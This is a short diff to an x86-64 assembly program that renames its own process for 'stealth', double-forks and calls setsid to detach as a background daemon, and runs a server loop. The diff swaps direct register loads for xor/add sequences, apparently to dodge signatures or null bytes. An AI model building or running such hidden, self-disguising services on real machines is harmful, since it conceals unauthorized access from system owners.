@@ -33,29 +33,34 @@ _start:
     lea     rsi, [rel pname]
     call    strcpy
     ; don't go stealth while it crashes :p
-    mov     rax, 0x39 ; fork
+    xor     eax, eax
+    add     eax, 0x39 ; fork
     syscall
     cmp     rax, 0
     jne     exit
-    mov     rax, 0x70 ; setsid
+    xor     eax, eax
+    add     eax, 0x70 ; setsid
     syscall
-    mov     rax, 0x39 ; fork
+    xor     eax, eax
+    add     eax, 0x39 ; fork
     syscall
-    cmp     rax, 0
+    cmp     eax, 0
     jne     exit
     call    create_server
 ; don't fork when it crashes :)
-    mov     rax, 0x39 ; fork
+    xor     eax, eax
+    add     eax, 0x39 ; fork
     syscall
-    cmp     rax, 0
+    cmp     eax, 0
     jne     fork2
     mov     rax, [rbp + 0x10]
     mov     BYTE [rax + 0xb], 54
     jmp     connect
 fork2:
-    mov     rax, 0x39 ; fork
+    xor     eax, eax
+    add     eax, 0x39 ; fork
     syscall
-    cmp     rax, 0
+    cmp     eax, 0
     jne     connect
     mov     rax, [rbp + 0x10]
     mov     BYTE [rax + 0xb], 55
@@ -63,7 +68,8 @@ connect:
     call    loop_server
 
 exit:
-    mov     rdi, 0
-    mov     rax, 0x3c ; exit
+    xor     rdi, rdi
+    xor     eax, eax
+    add     eax, 0x3c ; exit
     syscall
     ret 
